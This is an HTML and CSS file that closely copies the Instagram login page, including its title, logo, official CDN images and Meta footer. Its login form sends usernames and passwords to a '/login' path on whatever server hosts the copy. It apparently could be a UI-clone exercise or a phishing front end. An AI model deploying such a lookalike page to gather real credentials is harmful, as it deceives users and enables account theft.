<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* Reset & Base */
        * {
            box-sizing: border-box;
        }

        body {
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #262626;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* Layout */
        .page-content {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding-top: 32px;
            padding-bottom: 32px;
        }

        .main-container {
            display: flex;
            justify-content: center;
            align-items: center;
            max-width: 935px;
            width: 100%;
        }

        /* Left Side: Phones */
        .phones-container {
            width: 454px;
            /* Natural width of image roughly */
            height: 618px;
            background-image: url('https://upload.wikimedia.org/wikipedia/commons/a/aec/Instagram_phones_2022.png');
            /* Wiki placeholder or similar */
            background-size: cover;
            background-position: center;
            margin-right: 32px;
            display: none;
            /* Hidden on small screens */
        }

        @media (min-width: 876px) {
            .phones-container {
                display: block;
            }
        }

        /* Right Side: content */
        .auth-container {
            display: flex;
            flex-direction: column;
            width: 350px;
            max-width: 350px;
        }

        .card {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            margin-bottom: 10px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .login-card {
            padding: 40px;
        }

        .logo {
            margin: 0px auto 30px;
            width: 175px;
            display: block;
        }

        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .input-field {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px;
            margin-bottom: 6px;
            font-size: 14px;
            outline: none;
        }

        .input-field:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            padding: 7px 16px;
            margin-top: 15px;
            cursor: pointer;
            font-size: 14px;
        }

        .login-btn:disabled {
            opacity: 0.7;
        }

        .divider {
            display: flex;
            width: 100%;
            align-items: center;
            margin: 20px 0;
        }

        .line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .or {
            margin: 0 18px;
            font-size: 13px;
            font-weight: 600;
            color: #8e8e8e;
        }

        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .fb-login span {
            margin-right: 8px;
            font-weight: bold;
        }

        .forgot {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            text-align: center;
        }

        /* Signup & App Cards */
        .signup-card {
            padding: 20px 0;
            font-size: 14px;
        }

        .signup-card a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .get-app {
            text-align: center;
            font-size: 14px;
            margin: 10px 0;
        }

        .app-badges {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 20px 0;
        }

        .badge {
            height: 40px;
        }

        /* Footer */
        footer {
            padding-bottom: 52px;
            padding-top: 24px;
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 12px;
            color: #8e8e8e;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 20px;
        }

        .footer-links span {
            cursor: pointer;
        }

        .copyright {
            margin-top: 10px;
        }
    </style>
</head>

<body>

    <div class="page-content">
        <div class="main-container">
            <!-- Left: Phones Mockup (Using a generic placeholder that looks like the IG pile) -->
            <div class="phones-container"
                style="background-image: url('https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png?__makehaste_cache_breaker=HOgRclNOskB');">
            </div>

            <!-- Right: Auth Forms -->
            <div class="auth-container">

                <!-- Login Box -->
                <div class="card login-card">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png"
                        alt="Instagram" class="logo">

                    <form action="/login" method="POST">
                        <input type="text" name="email" class="input-field"
                            placeholder="Phone number, username, or email" required>
                        <input type="password" name="password" class="input-field" placeholder="Password" required>

                        <button type="submit" class="login-btn">Log in</button>
                    </form>

                    <div class="divider">
                        <div class="line"></div>
                        <div class="or">OR</div>
                        <div class="line"></div>
                    </div>

                    <a href="#" class="fb-login">
                        <span>f</span> Log in with Facebook
                    </a>

                    <a href="#" class="forgot">Forgot password?</a>
                </div>

                <!-- Sign Up Box -->
                <div class="card signup-card">
                    <span>Don't have an account? <a href="#">Sign up</a></span>
                </div>

                <!-- Get App -->
                <div class="get-app">
                    <p>Get the app.</p>
                    <div class="app-badges">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="App Store"
                            class="badge">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play"
                            class="badge">
                    </div>
                </div>

            </div>
        </div>
    </div>

    <footer>
        <div class="footer-links">
            <span>Meta</span>
            <span>About</span>
            <span>Blog</span>
            <span>Jobs</span>
            <span>Help</span>
            <span>API</span>
            <span>Privacy</span>
            <span>Terms</span>
            <span>Top Accounts</span>
            <span>Locations</span>
            <span>Instagram Lite</span>
            <span>Threads</span>
            <span>Contact Uploading & Non-Users</span>
            <span>Meta Verified</span>
        </div>
        <div class="copyright">
            &copy; 2024 Instagram from Meta
        </div>
    </footer>

</body>

</html>
